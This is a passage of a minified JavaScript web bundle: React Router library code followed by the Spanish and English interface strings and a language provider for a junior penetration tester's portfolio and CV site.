Ut(e,t,n){!t&&!Ht[e]&&(Ht[e]=!0,C(!1,n))}u.memo(Wt);function Wt({routes:e,manifest:t,future:n,state:r,isStatic:i,onError:a}){return wt(e,void 0,{manifest:t,state:r,isStatic:i,onError:a,future:n})}function Gt({to:e,replace:t,state:n,relative:r}){S(mt(),`<Navigate> may be used only in the context of a <Router> component.`);let{static:i,navigator:a}=u.useContext(it);C(!i,`<Navigate> must not be used on the initial render in a <StaticRouter>. This is a no-op, but you should modify your code so the <Navigate> is only ever rendered in response to some user interaction or state change.`);let{matches:o}=u.useContext(ot),{pathname:s}=ht(),c=_t(),l=Ae(e,ke(o),s,r===`path`);Ke(typeof e==`string`?e:re(e),a.createHref(l),Ue(a),`reject`);let d=JSON.stringify(l);return u.useEffect(()=>{c(JSON.parse(d),{replace:t,state:n,relative:r})},[c,d,r,t,n]),null}function Kt(e){return bt(e.context)}function qt(e){S(!1,`A <Route> is only ever to be used as the child of <Routes> element, never rendered directly. Please wrap your <Route> in a <Routes>.`)}function Jt({basename:e=`/`,children:t=null,location:n,navigationType:r=`POP`,navigator:i,static:a=!1,useTransitions:o}){S(!mt(),`You cannot render a <Router> inside another <Router>. You should never have more than one in your app.`);let s=e.replace(/^\/*/,`/`),c=u.useMemo(()=>({basename:s,navigator:i,static:a,useTransitions:o,future:{}}),[s,i,a,o]);typeof n==`string`&&(n=w(n));let{pathname:l=`/`,search:d=``,hash:f=``,state:p=null,key:m=`default`,mask:h}=n,g=u.useMemo(()=>{let e=we(l,s);return e==null?null:{location:{pathname:e,search:d,hash:f,state:p,key:m,mask:h},navigationType:r}},[s,l,d,f,p,m,r,h]);return C(g!=null,`<Router basename="${s}"> is not able to match the URL "${l}${d}${f}" because it does not start with the basename, so the <Router> won't render anything.`),g==null?null:u.createElement(it.Provider,{value:c},u.createElement(at.Provider,{children:t,value:g}))}function Yt({children:e,location:t}){return Ct(Xt(e),t)}u.Component;function Xt(e,t=[]){let n=[];return u.Children.forEach(e,(e,r)=>{if(!u.isValidElement(e))return;let i=[...t,r];if(e.type===u.Fragment){n.push.apply(n,Xt(e.props.children,i));return}S(e.type===qt,`[${typeof e.type==`string`?e.type:e.type.name}] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>`),S(!e.props.index||!e.props.children,`An index route cannot have child routes.`);let a={id:e.props.id||i.join(`-`),caseSensitive:e.props.caseSensitive,element:e.props.element,Component:e.props.Component,index:e.props.index,path:e.props.path,middleware:e.props.middleware,loader:e.props.loader,action:e.props.action,hydrateFallbackElement:e.props.hydrateFallbackElement,HydrateFallback:e.props.HydrateFallback,errorElement:e.props.errorElement,ErrorBoundary:e.props.ErrorBoundary,hasErrorBoundary:e.props.hasErrorBoundary===!0||e.props.ErrorBoundary!=null||e.props.errorElement!=null,shouldRevalidate:e.props.shouldRevalidate,handle:e.props.handle,lazy:e.props.lazy};e.props.children&&(a.children=Xt(e.props.children,i)),n.push(a)}),n}var Zt=`get`,Qt=`application/x-www-form-urlencoded`;function $t(e){return typeof HTMLElement<`u`&&e instanceof HTMLElement}function en(e){return $t(e)&&e.tagName.toLowerCase()===`button`}function tn(e){return $t(e)&&e.tagName.toLowerCase()===`form`}function nn(e){return $t(e)&&e.tagName.toLowerCase()===`input`}function rn(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}function an(e,t){return e.button===0&&(!t||t===`_self`)&&!rn(e)}var on=null;function sn(){if(on===null)try{new FormData(document.createElement(`form`),0),on=!1}catch{on=!0}return on}var cn=new Set([`application/x-www-form-urlencoded`,`multipart/form-data`,`text/plain`]);function ln(e){return e!=null&&!cn.has(e)?(C(!1,`"${e}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${Qt}"`),null):e}function un(e,t){let n,r,i,a,o;if(tn(e)){let o=e.getAttribute(`action`);r=o?we(o,t):null,n=e.getAttribute(`method`)||Zt,i=ln(e.getAttribute(`enctype`))||Qt,a=new FormData(e)}else if(en(e)||nn(e)&&(e.type===`submit`||e.type===`image`)){let o=e.form;if(o==null)throw Error(`Cannot submit a <button> or <input type="submit"> without a <form>`);let s=e.getAttribute(`formaction`)||o.getAttribute(`action`);if(r=s?we(s,t):null,n=e.getAttribute(`formmethod`)||o.getAttribute(`method`)||Zt,i=ln(e.getAttribute(`formenctype`))||ln(o.getAttribute(`enctype`))||Qt,a=new FormData(o,e),!sn()){let{name:t,type:n,value:r}=e;if(n===`image`){let e=t?`${t}.`:``;a.append(`${e}x`,`0`),a.append(`${e}y`,`0`)}else t&&a.append(t,r)}}else if($t(e))throw Error(`Cannot submit element that is not <form>, <button>, or <input type="submit|image">`);else n=Zt,r=null,i=Qt,o=e;return a&&i===`text/plain`&&(o=a,a=void 0),{action:r,method:n.toLowerCase(),encType:i,formData:a,body:o}}Object.getOwnPropertyNames(Object.prototype).sort().join(`\0`);var dn={"&":`\\u0026`,">":`\\u003e`,"<":`\\u003c`,"\u2028":`\\u2028`,"\u2029":`\\u2029`},fn=/[&><\u2028\u2029]/g;function pn(e){return e.replace(fn,e=>dn[e])}function mn(e,t){if(e===!1||e==null)throw Error(t)}function hn(e,t,n,r){let i=typeof e==`string`?new URL(e,typeof window>`u`?`server://singlefetch/`:window.location.origin):e;return n?i.pathname.endsWith(`/`)?i.pathname=`${i.pathname}_.${r}`:i.pathname=`${i.pathname}.${r}`:i.pathname===`/`?i.pathname=`_root.${r}`:t&&we(i.pathname,t)===`/`?i.pathname=`${Ne(t)}/_root.${r}`:i.pathname=`${Ne(i.pathname)}.${r}`,i}async function gn(e,t){if(e.id in t)return t[e.id];try{let n=await h(()=>import(e.module),[]);return t[e.id]=n,n}catch(t){return console.error(`Error loading route module \`${e.module}\`, reloading page...`),console.error(t),window.__reactRouterContext&&window.__reactRouterContext.isSpaMode,window.location.reload(),new Promise(()=>{})}}function _n(e){return e!=null&&typeof e.page==`string`}function vn(e){return e==null?!1:e.href==null?e.rel===`preload`&&typeof e.imageSrcSet==`string`&&typeof e.imageSizes==`string`:typeof e.rel==`string`&&typeof e.href==`string`}async function yn(e,t,n){return wn((await Promise.all(e.map(async e=>{let r=t.routes[e.route.id];if(r){let e=await gn(r,n);return e.links?e.links():[]}return[]}))).flat(1).filter(vn).filter(e=>e.rel===`stylesheet`||e.rel===`preload`).map(e=>e.rel===`stylesheet`?{...e,rel:`prefetch`,as:`style`}:{...e,rel:`prefetch`}))}function bn(e,t,n,r,i,a){let o=(e,t)=>!n[t]||e.route.id!==n[t].route.id,s=(e,t)=>n[t].pathname!==e.pathname||n[t].route.path?.endsWith(`*`)&&n[t].params[`*`]!==e.params[`*`];return a===`assets`?t.filter((e,t)=>o(e,t)||s(e,t)):a===`data`?t.filter((t,a)=>{let c=r.routes[t.route.id];if(!c||!c.hasLoader)return!1;if(o(t,a)||s(t,a))return!0;if(t.route.shouldRevalidate){let r=t.route.shouldRevalidate({currentUrl:new URL(i.pathname+i.search+i.hash,window.origin),currentParams:n[0]?.params||{},nextUrl:new URL(e,window.origin),nextParams:t.params,defaultShouldRevalidate:!0});if(typeof r==`boolean`)return r}return!0}):[]}function xn(e,t,{includeHydrateFallback:n}={}){return Sn(e.map(e=>{let r=t.routes[e.route.id];if(!r)return[];let i=[r.module];return r.clientActionModule&&(i=i.concat(r.clientActionModule)),r.clientLoaderModule&&(i=i.concat(r.clientLoaderModule)),n&&r.hydrateFallbackModule&&(i=i.concat(r.hydrateFallbackModule)),r.imports&&(i=i.concat(r.imports)),i}).flat(1))}function Sn(e){return[...new Set(e)]}function Cn(e){let t={},n=Object.keys(e).sort();for(let r of n)t[r]=e[r];return t}function wn(e,t){let n=new Set,r=new Set(t);return e.reduce((e,i)=>{if(t&&!_n(i)&&i.as===`script`&&i.href&&r.has(i.href))return e;let a=JSON.stringify(Cn(i));return n.has(a)||(n.add(a),e.push({key:a,link:i})),e},[])}function Tn(){let e=u.useContext(Ze);return mn(e,`You must render this element inside a <DataRouterContext.Provider> element`),e}function En(){let e=u.useContext(Qe);return mn(e,`You must render this element inside a <DataRouterStateContext.Provider> element`),e}var Dn=u.createContext(void 0);Dn.displayName=`FrameworkContext`;function On(){let e=u.useContext(Dn);return mn(e,`You must render this element inside a <HydratedRouter> element`),e}function kn(e,t){let n=u.useContext(Dn),[r,i]=u.useState(!1),[a,o]=u.useState(!1),{onFocus:s,onBlur:c,onMouseEnter:l,onMouseLeave:d,onTouchStart:f}=t,p=u.useRef(null);u.useEffect(()=>{if(e===`render`&&o(!0),e===`viewport`){let e=new IntersectionObserver(e=>{e.forEach(e=>{o(e.isIntersecting)})},{threshold:.5});return p.current&&e.observe(p.current),()=>{e.disconnect()}}},[e]),u.useEffect(()=>{if(r){let e=setTimeout(()=>{o(!0)},100);return()=>{clearTimeout(e)}}},[r]);let m=()=>{i(!0)},h=()=>{i(!1),o(!1)};return n?e===`intent`?[a,p,{onFocus:An(s,m),onBlur:An(c,h),onMouseEnter:An(l,m),onMouseLeave:An(d,h),onTouchStart:An(f,m)}]:[a,p,{}]:[!1,p,{}]}function An(e,t){return n=>{e&&e(n),n.defaultPrevented||t(n)}}function jn({page:e,...t}){let n=et(),{nonce:r}=On(),{router:i}=Tn(),a=u.useMemo(()=>oe(i.routes,e,i.basename),[i.routes,e,i.basename]);return a?(t.nonce==null&&r&&(t={...t,nonce:r}),n?u.createElement(Nn,{page:e,matches:a,...t}):u.createElement(Pn,{page:e,matches:a,...t})):null}function Mn(e){let{manifest:t,routeModules:n}=On(),[r,i]=u.useState([]);return u.useEffect(()=>{let r=!1;return yn(e,t,n).then(e=>{r||i(e)}),()=>{r=!0}},[e,t,n]),r}function Nn({page:e,matches:t,...n}){let r=ht(),{future:i}=On(),{basename:a}=Tn(),o=u.useMemo(()=>{if(e===r.pathname+r.search+r.hash)return[];let n=hn(e,a,i.v8_trailingSlashAwareDataRequests,`rsc`),o=!1,s=[];for(let e of t)typeof e.route.shouldRevalidate==`function`?o=!0:s.push(e.route.id);return o&&s.length>0&&n.searchParams.set(`_routes`,s.join(`,`)),[n.pathname+n.search]},[a,i.v8_trailingSlashAwareDataRequests,e,r,t]);return u.createElement(u.Fragment,null,o.map(e=>u.createElement(`link`,{key:e,rel:`prefetch`,as:`fetch`,href:e,...n})))}function Pn({page:e,matches:t,...n}){let r=ht(),{future:i,manifest:a,routeModules:o}=On(),{basename:s}=Tn(),{loaderData:c,matches:l}=En(),d=u.useMemo(()=>bn(e,t,l,a,r,`data`),[e,t,l,a,r]),f=u.useMemo(()=>bn(e,t,l,a,r,`assets`),[e,t,l,a,r]),p=u.useMemo(()=>{if(e===r.pathname+r.search+r.hash)return[];let n=new Set,l=!1;if(t.forEach(e=>{let t=a.routes[e.route.id];!t||!t.hasLoader||(!d.some(t=>t.route.id===e.route.id)&&e.route.id in c&&o[e.route.id]?.shouldRevalidate||t.hasClientLoader?l=!0:n.add(e.route.id))}),n.size===0)return[];let u=hn(e,s,i.v8_trailingSlashAwareDataRequests,`data`);return l&&n.size>0&&u.searchParams.set(`_routes`,t.filter(e=>n.has(e.route.id)).map(e=>e.route.id).join(`,`)),[u.pathname+u.search]},[s,i.v8_trailingSlashAwareDataRequests,c,r,a,d,t,e,o]),m=u.useMemo(()=>xn(f,a),[f,a]),h=Mn(f);return u.createElement(u.Fragment,null,p.map(e=>u.createElement(`link`,{key:e,rel:`prefetch`,as:`fetch`,href:e,...n})),m.map(e=>u.createElement(`link`,{key:e,rel:`modulepreload`,href:e,...n})),h.map(({key:e,link:t})=>u.createElement(`link`,{key:e,nonce:n.nonce,...t,crossOrigin:t.crossOrigin??n.crossOrigin})))}function Fn(...e){return t=>{e.forEach(e=>{typeof e==`function`?e(t):e!=null&&(e.current=t)})}}u.Component;var In=typeof window<`u`&&window.document!==void 0&&window.document.createElement!==void 0;try{In&&(window.__reactRouterVersion=`7.18.4`)}catch{}function Ln({basename:e,children:t,useTransitions:n,window:r}){let i=u.useRef();i.current??=x({window:r,v5Compat:!0});let a=i.current,[o,s]=u.useState({action:a.action,location:a.location}),c=u.useCallback(e=>{n===!1?s(e):u.startTransition(()=>s(e))},[n]);return u.useLayoutEffect(()=>a.listen(c),[a,c]),u.createElement(Jt,{basename:e,children:t,location:o.location,navigationType:o.action,navigator:a,useTransitions:n})}function Rn({basename:e,children:t,history:n,useTransitions:r}){let[i,a]=u.useState({action:n.action,location:n.location}),o=u.useCallback(e=>{r===!1?a(e):u.startTransition(()=>a(e))},[r]);return u.useLayoutEffect(()=>n.listen(o),[n,o]),u.createElement(Jt,{basename:e,children:t,location:i.location,navigationType:i.action,navigator:n,useTransitions:r})}Rn.displayName=`unstable_HistoryRouter`;var k=u.forwardRef(function({onClick:e,discover:t=`render`,prefetch:n=`none`,relative:r,reloadDocument:i,replace:a,mask:o,state:s,target:c,to:l,preventScrollReset:d,viewTransition:f,defaultShouldRevalidate:p,...m},h){let{basename:_,navigator:v,useTransitions:y}=u.useContext(it),b=typeof l==`string`&&g.test(l),x=Ve(l,_);l=x.to;let S=pt(l,{relative:r}),C=ht(),ee=null;if(o){let e=Ae(o,[],C.mask?C.mask.pathname:`/`,!0);_!==`/`&&(e.pathname=e.pathname===`/`?_:Me([_,e.pathname])),ee=v.createHref(e)}let[te,ne,re]=kn(n,m),w=Gn(l,{replace:a,mask:o,state:s,target:c,preventScrollReset:d,relative:r,viewTransition:f,defaultShouldRevalidate:p,useTransitions:y});function ie(t){e&&e(t),t.defaultPrevented||w(t)}let ae=!(x.isExternal||i),oe=u.createElement(`a`,{...m,...re,href:(ae?ee:void 0)||x.absoluteURL||S,onClick:ae?ie:e,ref:Fn(h,ne),target:c,"data-discover":!b&&t===`render`?`true`:void 0});return te&&!b?u.createElement(u.Fragment,null,oe,u.createElement(jn,{page:S})):oe});k.displayName=`Link`;var zn=u.forwardRef(function({"aria-current":e=`page`,caseSensitive:t=!1,className:n=``,end:r=!1,style:i,to:a,viewTransition:o,children:s,...c},l){let d=St(a,{relative:c.relative}),f=ht(),p=u.useContext(Qe),{navigator:m,basename:h}=u.useContext(it),g=p!=null&&tr(d)&&o===!0,_=m.encodeLocation?m.encodeLocation(d).pathname:d.pathname,v=f.pathname,y=p&&p.navigation&&p.navigation.location?p.navigation.location.pathname:null;t||(v=v.toLowerCase(),y=y?y.toLowerCase():null,_=_.toLowerCase()),y&&h&&(y=we(y,h)||y);let b=_!==`/`&&_.endsWith(`/`)?_.length-1:_.length,x=v===_||!r&&v.startsWith(_)&&v.charAt(b)===`/`,S=y!=null&&(y===_||!r&&y.startsWith(_)&&y.charAt(_.length)===`/`),C={isActive:x,isPending:S,isTransitioning:g},ee=x?e:void 0,te;te=typeof n==`function`?n(C):[n,x?`active`:null,S?`pending`:null,g?`transitioning`:null].filter(Boolean).join(` `);let ne=typeof i==`function`?i(C):i;return u.createElement(k,{...c,"aria-current":ee,className:te,ref:l,style:ne,to:a,viewTransition:o},typeof s==`function`?s(C):s)});zn.displayName=`NavLink`;var Bn=u.forwardRef(({discover:e=`render`,fetcherKey:t,navigate:n,reloadDocument:r,replace:i,state:a,method:o=Zt,action:s,onSubmit:c,relative:l,preventScrollReset:d,viewTransition:f,defaultShouldRevalidate:p,...m},h)=>{let{useTransitions:_}=u.useContext(it),v=Jn(),y=Yn(s,{relative:l}),b=o.toLowerCase()===`get`?`get`:`post`,x=typeof s==`string`&&g.test(s);return u.createElement(`form`,{ref:h,method:b,action:y,onSubmit:r?c:e=>{if(c&&c(e),e.defaultPrevented)return;e.preventDefault();let r=e.nativeEvent.submitter,s=r?.getAttribute(`formmethod`)||o,m=()=>v(r||e.currentTarget,{fetcherKey:t,method:s,navigate:n,replace:i,state:a,relative:l,preventScrollReset:d,viewTransition:f,defaultShouldRevalidate:p});_&&n!==!1?u.startTransition(()=>m()):m()},...m,"data-discover":!x&&e===`render`?`true`:void 0})});Bn.displayName=`Form`;function Vn({getKey:e,storageKey:t,...n}){let r=u.useContext(Dn),{basename:i}=u.useContext(it),a=ht(),o=zt();$n({getKey:e,storageKey:t});let s=u.useMemo(()=>{if(!r||!e)return null;let t=Qn(a,o,i,e);return t===a.key?null:t},[]);if(!r||r.isSpaMode)return null;let c=((e,t)=>{if(!window.history.state||!window.history.state.key){let e=Math.random().toString(32).slice(2);window.history.replaceState({key:e},``)}try{let n=JSON.parse(sessionStorage.getItem(e)||`{}`)[t||window.history.state.key];typeof n==`number`&&window.scrollTo(0,n)}catch(t){console.error(t),sessionStorage.removeItem(e)}}).toString();return n.nonce==null&&r?.nonce&&(n.nonce=r.nonce),u.createElement(`script`,{...n,suppressHydrationWarning:!0,dangerouslySetInnerHTML:{__html:`(${c})(${pn(JSON.stringify(t||Xn))}, ${pn(JSON.stringify(s))})`}})}Vn.displayName=`ScrollRestoration`;function Hn(e){return`${e} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function Un(e){let t=u.useContext(Ze);return S(t,Hn(e)),t}function Wn(e){let t=u.useContext(Qe);return S(t,Hn(e)),t}function Gn(e,{target:t,replace:n,mask:r,state:i,preventScrollReset:a,relative:o,viewTransition:s,defaultShouldRevalidate:c,useTransitions:l}={}){let d=_t(),f=ht(),p=St(e,{relative:o});return u.useCallback(m=>{if(an(m,t)){m.preventDefault();let t=n===void 0?re(f)===re(p):n,h=()=>d(e,{replace:t,mask:r,state:i,preventScrollReset:a,relative:o,viewTransition:s,defaultShouldRevalidate:c});l?u.startTransition(()=>h()):h()}},[f,d,p,n,r,i,t,e,a,o,s,c,l])}var Kn=0,qn=()=>`__${String(++Kn)}__`;function Jn(){let{router:e}=Un(`useSubmit`),{basename:t}=u.useContext(it),n=Lt(),r=e.fetch,i=e.navigate;return u.useCallback(async(e,a={})=>{let{action:o,method:s,encType:c,formData:l,body:u}=un(e,t);if(a.navigate===!1){let e=a.fetcherKey||qn();await r(e,n,a.action||o,{defaultShouldRevalidate:a.defaultShouldRevalidate,preventScrollReset:a.preventScrollReset,formData:l,body:u,formMethod:a.method||s,formEncType:a.encType||c,flushSync:a.flushSync})}else await i(a.action||o,{defaultShouldRevalidate:a.defaultShouldRevalidate,preventScrollReset:a.preventScrollReset,formData:l,body:u,formMethod:a.method||s,formEncType:a.encType||c,replace:a.replace,state:a.state,fromRouteId:n,flushSync:a.flushSync,viewTransition:a.viewTransition})},[r,i,t,n])}function Yn(e,{relative:t}={}){let{basename:n}=u.useContext(it),r=u.useContext(ot);S(r,`useFormAction must be used inside a RouteContext`);let[i]=r.matches.slice(-1),a={...St(e||`.`,{relative:t})},o=ht();if(e==null){a.search=o.search;let e=new URLSearchParams(a.search),t=e.getAll(`index`);if(t.some(e=>e===``)){e.delete(`index`),t.filter(e=>e).forEach(t=>e.append(`index`,t));let n=e.toString();a.search=n?`?${n}`:``}}return(!e||e===`.`)&&i.route.index&&(a.search=a.search?a.search.replace(/^\?/,`?index&`):`?index`),n!==`/`&&(a.pathname=a.pathname===`/`?n:Me([n,a.pathname])),re(a)}var Xn=`react-router-scroll-positions`,Zn={};function Qn(e,t,n,r){let i=null;return r&&(i=r(n===`/`?e:{...e,pathname:we(e.pathname,n)||e.pathname},t)),i??=e.key,i}function $n({getKey:e,storageKey:t}={}){let{router:n}=Un(`useScrollRestoration`),{restoreScrollPosition:r,preventScrollReset:i}=Wn(`useScrollRestoration`),{basename:a}=u.useContext(it),o=ht(),s=zt(),c=Rt();u.useEffect(()=>(window.history.scrollRestoration=`manual`,()=>{window.history.scrollRestoration=`auto`}),[]),er(u.useCallback(()=>{if(c.state===`idle`){let t=Qn(o,s,a,e);Zn[t]=window.scrollY}try{sessionStorage.setItem(t||Xn,JSON.stringify(Zn))}catch(e){C(!1,`Failed to save scroll positions in sessionStorage, <ScrollRestoration /> will not work properly (${e}).`)}window.history.scrollRestoration=`auto`},[c.state,e,a,o,s,t])),typeof document<`u`&&(u.useLayoutEffect(()=>{try{let e=sessionStorage.getItem(t||Xn);e&&(Zn=JSON.parse(e))}catch{}},[t]),u.useLayoutEffect(()=>{let t=n?.enableScrollRestoration(Zn,()=>window.scrollY,e?(t,n)=>Qn(t,n,a,e):void 0);return()=>t&&t()},[n,a,e]),u.useLayoutEffect(()=>{if(r!==!1){if(typeof r==`number`){window.scrollTo(0,r);return}try{if(o.hash){let e=document.getElementById(decodeURIComponent(o.hash.slice(1)));if(e){e.scrollIntoView();return}}}catch{C(!1,`"${o.hash.slice(1)}" is not a decodable element ID. The view will not scroll to it.`)}i!==!0&&window.scrollTo(0,0)}},[o,r,i]))}function er(e,t){let{capture:n}=t||{};u.useEffect(()=>{let t=n==null?void 0:{capture:n};return window.addEventListener(`pagehide`,e,t),()=>{window.removeEventListener(`pagehide`,e,t)}},[e,n])}function tr(e,{relative:t}={}){let n=u.useContext(tt);S(n!=null,"`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?");let{basename:r}=Un(`useViewTransitionState`),i=St(e,{relative:t});if(!n.isTransitioning)return!1;let a=we(n.currentLocation.pathname,r)||n.currentLocation.pathname,o=we(n.nextLocation.pathname,r)||n.nextLocation.pathname;return be(i.pathname,o)!=null||be(i.pathname,a)!=null}var nr={es:{nav:{about:`Perfil`,xp:`Experiencia`,edu:`Formación`,labs:`Proyectos`,oscp:`OSCP`,github:`GitHub`,skills:`Skills`,contact:`Contacto`,downloadCV:`Descargar CV`},hero:{kicker:`// Curriculum Vitae · Junior Penetration Tester`,role:`Junior Penetration Tester · eJPTv2 · OSCP Candidate`,tagline:`Apasionado por la Ciberseguridad y la Informática`,desc:`Estudiante de Administración de Sistemas Informáticos en Red con gran interés en la ciberseguridad y la monitorización de sistemas. Experiencia práctica en análisis de logs, detección de amenazas con Splunk y pruebas de penetración en entornos controlados. Busco oportunidades de prácticas o posiciones junior en sistemas, redes o ciberseguridad.`,contact:`Contáctame ↗`,viewGH:`Ver en GitHub ↗`,openToWork:`Open to work`},sections:{xp:`/02 · Experiencia Profesional`,edu:`/03 · Formación & Certificaciones`,labs:`/04 · Proyectos Destacados`,oscp:`/05 · OSCP Journey`,github:`/06 · GitHub Activity`,skills:`/07 · Habilidades Técnicas`,contact:`/08 · Contacto`},xp:{role:`Vigilante de Seguridad`,company:`Viten Seguridad y Transportes Blindados S.A.`,period:`2018 – 2026`,items:[`Aplicación de protocolos de seguridad y gestión de incidentes.`,`Vigilancia preventiva y detección de riesgos.`,`Toma de decisiones críticas bajo presión.`]},edu:{education:`Educación`,certs:`Certificaciones & Formación`,extras:`Información Adicional`,degree:`Administración de Sistemas Informáticos en Red (ASIR)`,school:`FP Euroformac`,period:`2025 – Actualidad`,extrasItems:[`— Inglés: nivel intermedio`,`— Carnet de conducir y vehículo propio`,`— Disponibilidad para viajar`]},labs:{featuredLabel:`Blue Team · Docker · 9 Labs`,featuredDesc:`Colección de labs SOC empaquetados en Docker: levantas el entorno e investigas técnicas reales de atacante con herramientas reales (Wireshark, tcpdump, Splunk). Cada lab es determinista, mapeado a MITRE ATT&CK e incluye reglas Sigma/Suricata.`,viewGH:`Ver en GitHub ↗`},oscp:{title:`Diario de Entrenamiento`,desc:`Registro cronológico de mi preparación para la certificación OSCP de OffSec. Máquinas vulneradas, laboratorios y conceptos aprendidos.`,readWriteUp:`Leer WriteUp ↗`},github:{repos:`Repositorios Públicos`,followers:`Seguidores`,stars:`Estrellas totales`,updated:`Actualizado`,viewAll:`Ver todos los repos ↗`,loading:`Cargando datos de GitHub...`,error:`No se pudo cargar GitHub.`},skills:{groups:{blue:`Blue Team & SIEM`,dfir:`Forensics & DFIR`,off:`Offensive (fundamentos)`,sys:`Sistemas & Dev`}},contact:{title:`Envíame un mensaje`,desc:`Disponible para prácticas, posiciones junior o colaboraciones. Respondo en menos de 24h.`,name:`Nombre`,email:`Email`,subject:`Asunto`,message:`Mensaje`,send:`Enviar mensaje ↗`,sending:`Enviando...`,success:`✓ Mensaje enviado. Te respondo pronto.`,error:`✗ Error al enviar. Prueba con el email directo.`,placeholders:{name:`Tu nombre`,email:`tu@email.com`,subject:`Asunto del mensaje`,message:`Hola Alberto, me gustaría...`}},ui:{search:`Buscar…`,searchPlaceholder:`Buscar en el sitio…`,noResults:`Sin resultados`,menu:`Menú`,closeMenu:`Cerrar menú`,onThisPage:`En esta página`,previous:`Anterior`,next:`Siguiente`,switchLang:`Switch to English`,openToWork:`Open to work`,comingSoon:`Próximamente`,inPreparation:`Contenido en preparación.`,related:`Contenido relacionado`,projects:`Proyectos`,writeups:`Writeups`,articles:`Artículos`,areas:`Áreas`,technologies:`Tecnologías`,status:`Estado`,statusActive:`Activo`,statusProgress:`En curso`,statusPlanned:`Previsto`,certVerified:`Certificado`,certProgress:`En progreso`,certPreparing:`Preparación activa`,viewAll:`Ver todos`,backToProjects:`← Todos los proyectos`,notFoundTitle:`Página no encontrada`,notFoundDesc:`La página que buscas no existe o se ha movido.`,goHome:`Volver al inicio`,copyLink:`Copiar enlace`,copied:`Copiado`},footer:{role:`Junior Penetration Tester`}},en:{nav:{about:`Profile`,xp:`Experience`,edu:`Education`,labs:`Projects`,oscp:`OSCP`,github:`GitHub`,skills:`Skills`,contact:`Contact`,downloadCV:`Download CV`},hero:{kicker:`// Curriculum Vitae · Junior Penetration Tester`,role:`Junior Penetration Tester · eJPTv2 · OSCP Candidate`,tagline:`Passionate about Cybersecurity and Computer Science`,desc:`Network Systems Administration (ASIR) student with a strong interest in cybersecurity and systems monitoring. Hands-on experience in log analysis, threat detection with Splunk and penetration testing in controlled environments. Seeking internships or junior roles in systems, networking or cybersecurity.`,contact:`Contact me ↗`,viewGH:`View on GitHub ↗`,openToWork:`Open to work`},sections:{xp:`/02 · Professional Experience`,edu:`/03 · Education & Certifications`,labs:`/04 · Featured Projects`,oscp:`/05 · OSCP Journey`,github:`/06 · GitHub Activity`,skills:`/07 · Technical Skills`,contact:`/08 · Contact`},xp:{role:`Security Officer`,company:`Viten Seguridad y Transportes Blindados S.A.`,period:`2018 – 2026`,items:[`Applying security protocols and incident management.`,`Preventive surveillance and risk detection.`,`Critical decision-making under pressure.`]},edu:{education:`Education`,certs:`Certifications & Training`,extras:`Additional Information`,degree:`Network Systems Administration (ASIR)`,school:`FP Euroformac`,period:`2025 – Present`,extrasItems:[`— English: intermediate level`,`— Driving licence and own vehicle`,`— Available to travel`]},labs:{featuredLabel:`Blue Team · Docker · 9 Labs`,featuredDesc:`A collection of SOC labs packaged in Docker: spin up the environment and investigate real attacker techniques with real tools (Wireshark, tcpdump, Splunk). Each lab is deterministic, mapped to MITRE ATT&CK and includes Sigma/Suricata detection rules.`,viewGH:`View on GitHub ↗`},oscp:{title:`Training Log`,desc:`Chronological log of my preparation for the OffSec OSCP certification. Compromised machines, labs, and concepts learned.`,readWriteUp:`Read WriteUp ↗`},github:{repos:`Public Repositories`,followers:`Followers`,stars:`Total Stars`,updated:`Updated`,viewAll:`View all repos ↗`,loading:`Loading GitHub data...`,error:`Could not load GitHub.`},skills:{groups:{blue:`Blue Team & SIEM`,dfir:`Forensics & DFIR`,off:`Offensive (foundations)`,sys:`Systems & Dev`}},contact:{title:`Send me a message`,desc:`Available for internships, junior roles or collaborations. I reply within 24h.`,name:`Name`,email:`Email`,subject:`Subject`,message:`Message`,send:`Send message ↗`,sending:`Sending...`,success:`✓ Message sent. I'll reply soon.`,error:`✗ Failed to send. Try the direct email.`,placeholders:{name:`Your name`,email:`you@email.com`,subject:`Message subject`,message:`Hi Alberto, I would like to...`}},ui:{search:`Search…`,searchPlaceholder:`Search the site…`,noResults:`No results`,menu:`Menu`,closeMenu:`Close menu`,onThisPage:`On this page`,previous:`Previous`,next:`Next`,switchLang:`Cambiar a español`,openToWork:`Open to work`,comingSoon:`Coming soon`,inPreparation:`Content in preparation.`,related:`Related content`,projects:`Projects`,writeups:`Writeups`,articles:`Articles`,areas:`Areas`,technologies:`Technologies`,status:`Status`,statusActive:`Active`,statusProgress:`In progress`,statusPlanned:`Planned`,certVerified:`Certified`,certProgress:`In progress`,certPreparing:`Actively preparing`,viewAll:`View all`,backToProjects:`← All projects`,notFoundTitle:`Page not found`,notFoundDesc:`The page you are looking for does not exist or has moved.`,goHome:`Back to home`,copyLink:`Copy link`,copied:`Copied`},footer:{role:`Junior Penetration Tester`}}},A=r(),rr=(0,u.createContext)();function ir({children:e}){let[t,n]=(0,u.useState)(()=>{let e=localStorage.getItem(`lang`);return e===`en`||e===`es`?e:`es`});return(0,u.useEffect)(()=>{localStorage.setItem(`lang`,t),document.documentElement.lang=t},[t]),(0,A.jsx)(rr.Provider,{value:{lang:t,toggle:()=>n(e=>e===`es`?`en`:`es`),t:e=>{let n=e.split(`.`),r=nr[t];for(let e of n)r=r?.[e];return r??e},tr:e=>e&&typeof e==`object`&&(`es`in e||`en`in e)?e[t]??e.es??e.en:e},children:e})}var ar=()=>(0,u.useContext)(rr);function or({opacity:e=.08}){let t=(0,u.useRef)(null);return(0,u.useEffect)(()=>{let e=t.current;if(!e)return;let n=e.getContext(`2d`),r=[],i=0,a=0,o,s=0,c=()=>{let t=e.parentElement;if(!t)return;let o=window.devicePixelRatio||1;i=t.clientWidth||280,a=t.clientHeight||window.innerHeight,e.width=i*o,e.height=a*o,n.setTransform(o,0,0,o,0,0);let s=Math.max(1,Math.ceil(i/13));r=Array.from({length:s},()=>Math.random()*-30)},l=e=>{o=requestAnimationFrame(l),!(e-s<55)&&(s=e,n.fillStyle=`rgba(26, 29, 26, 0.18)`,n.fillRect(0,0,i,a),n.font=`13px "JetBrains Mono", monospace`,r.forEach((e,t)=>{let 